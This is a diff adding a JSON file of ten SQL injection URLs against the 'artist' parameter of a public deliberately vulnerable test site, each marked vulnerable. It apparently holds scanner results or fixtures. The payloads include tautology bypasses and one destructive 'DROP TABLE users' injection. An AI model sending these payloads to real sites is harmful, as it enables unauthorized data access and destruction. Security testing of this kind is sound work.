@@ -1,0 +1,42 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR 1=1 --",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1' --",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1' /*",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist='; DROP TABLE users; --",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR 'a'='a",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR 1=1#",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR 1=1/*",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR 1=1 LIMIT 1--",
+        "vulnerable": true
+    },
+    {
+        "url": "http://testphp.vulnweb.com/artists.php?artist=' OR EXISTS(SELECT * FROM users)--",
+        "vulnerable": true
+    }
+]
